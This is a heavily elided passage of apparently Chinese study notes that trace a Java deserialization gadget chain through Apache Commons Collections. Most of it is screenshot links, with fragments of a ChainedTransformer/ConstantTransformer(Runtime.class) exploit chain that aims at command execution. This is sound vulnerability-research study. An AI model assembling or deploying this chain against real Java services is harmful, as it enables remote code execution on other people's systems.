...
![](Picture/屏幕截图 2024-11-02 002314.png)
...
![](Picture/屏幕截图 2024-11-02 225056.png)
...
![](Picture/屏幕截图 2024-11-03 200724.png)
- 我们在往上找，看到 `forName` 第二个参数传的是 `true`，所以 `forName()` 默认初始化。
![](Picture/屏幕截图 2024-11-03 201101.png)
...
![](Picture/屏幕截图 2024-11-03 213254.png)
...
![](Picture/屏幕截图 2024-11-03 104308.png)
- 我们看到它调用了 `handler` 的 `hashcode()`，我们继续跟进。  
![](Picture/屏幕截图 2024-11-03 105323.png)
...
![](Picture/屏幕截图 2024-11-03 221456.png)
- 通过危险方法的调用。
```Java
public class Main {  
    public static void main(String[] args) throws Exception {      
...
![](Picture/屏幕截图 2024-11-03 231523.png)
- 去看看能不能控制参数传入，发现可以构造传入，这个类不是 public，所以要反射获取类。    
![](Picture/屏幕截图 2024-11-03 232316.png)
### 目前的问题
...
![](Picture/屏幕截图 2024-11-04 090512.png)
- 解决方法 2
```Java
HashMap<Object,Object> map = new HashMap<>();  
map.put("value","aaa");  
...
![](Picture/屏幕截图 2024-11-04 093610.png)
![](Picture/屏幕截图 2024-11-04 093713.png)
- 解决方法 3
```Java
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(Runtime.class),  
...
![](Picture/屏幕截图 2024-11-09 182705.png)
### 最终利用链
```Java  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
